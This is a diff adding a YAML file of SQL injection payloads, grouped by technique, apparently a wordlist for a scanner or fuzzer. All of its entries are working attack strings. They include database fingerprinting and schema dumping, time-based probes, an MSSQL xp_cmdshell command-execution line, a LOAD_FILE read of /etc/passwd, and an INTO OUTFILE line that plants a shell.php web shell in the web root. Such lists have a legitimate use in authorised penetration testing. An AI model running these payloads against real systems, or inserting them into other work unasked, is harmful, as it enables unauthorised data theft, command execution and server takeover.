@@ -1,0 +1,60 @@
+# SQL Injection Payloads
+# Organized by technique
+
+error_based:
+  # Classic single-quote breaks
+  - "'"
+  - "''"
+  - "\"" 
+  - "' OR '1'='1"
+  - "' OR '1'='1'--"
+  - "' OR '1'='1'/*"
+  - "' OR 1=1--"
+  - "' OR 1=1#"
+  - "admin'--"
+  - "' OR 'x'='x"
+  - "') OR ('1'='1"
+  - "1; SELECT 1--"
+  - "1' AND 1=0 UNION SELECT NULL--"
+  # MySQL specific
+  - "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--"
+  - "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+  # MSSQL specific
+  - "'; EXEC xp_cmdshell('ping 127.0.0.1')--"
+  - "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--"
+
+blind_boolean:
+  - "' AND 1=1--"
+  - "' AND 1=2--"
+  - "' AND 'a'='a"
+  - "' AND 'a'='b"
+  - "1 AND 1=1"
+  - "1 AND 1=2"
+  - "' AND SUBSTRING(username,1,1)='a'--"
+  - "' AND LENGTH(username)>0--"
+  - "' OR IF(1=1,1,0)--"
+  - "' OR IF(1=2,1,0)--"
+
+time_based:
+  # MySQL
+  - "' AND SLEEP(5)--"
+  - "' OR SLEEP(5)--"
+  - "1'; WAITFOR DELAY '0:0:5'--"
+  # PostgreSQL
+  - "'; SELECT pg_sleep(5)--"
+  # Generic
+  - "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+  - "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+
+union_based:
+  - "' UNION SELECT NULL--"
+  - "' UNION SELECT NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL--"
+  - "' UNION SELECT 1,2,3--"
+  - "' UNION SELECT @@version,NULL--"
+  - "' UNION SELECT table_name,NULL FROM information_schema.tables--"
+  - "' UNION ALL SELECT NULL,NULL,NULL--"
+
+out_of_band:
+  - "' AND LOAD_FILE('/etc/passwd')--"
+  - "'; SELECT * INTO OUTFILE '/var/www/html/shell.php'--"
